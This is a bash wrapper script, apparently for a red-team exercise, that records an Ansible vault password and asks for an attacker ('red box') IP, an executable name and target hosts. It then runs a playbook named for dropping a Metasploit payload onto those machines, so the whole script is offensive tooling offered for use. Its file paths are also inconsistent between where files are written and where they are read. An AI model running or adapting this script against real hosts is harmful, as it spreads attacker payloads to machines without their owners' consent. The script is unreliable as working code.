#!/bin/bash

if [ ! -f ansible/.vault_pass ]
then
    echo "Please enter the vault password: "
    read -s vault_pass

    echo $vault_pass > ./ansible/.vault_pass
    chmod 0600 ./ansible/.vault_pass
fi

echo ""
echo "Enter target(s): "
echo ""
echo "Targets must be separated by space. Valid targets include the following:"
echo "For groups of systems: subnet1 subnet2 subnet3"
echo "For specific system: user1 user2 user3 (up to user30)"
echo ""

echo "Enter red box IP: "
read redIP

echo "Enter red Executable Name: "
read redExec

sed -i "/red_ip:/c\red_ip: $redIP" ansible/group_vars/all/vars.yml
sed -i "/red_executable:/c\red_executable: $redExec" ansible/group_vars/all/vars.yml

echo "Enter target to drop payload to: "
read targs

sed -i "/- name: Drop/{n;s/.*/  hosts: $targs/}" ansible/playbook-msf-drop-payload.yml


ansible-playbook -i inventory/production/inventory.yml.yml --vault-password-file ./.vault_pass playbooks/production/playbook-msf-drop-payload.yml
echo ""
echo ""
echo "Action complete."
echo ""
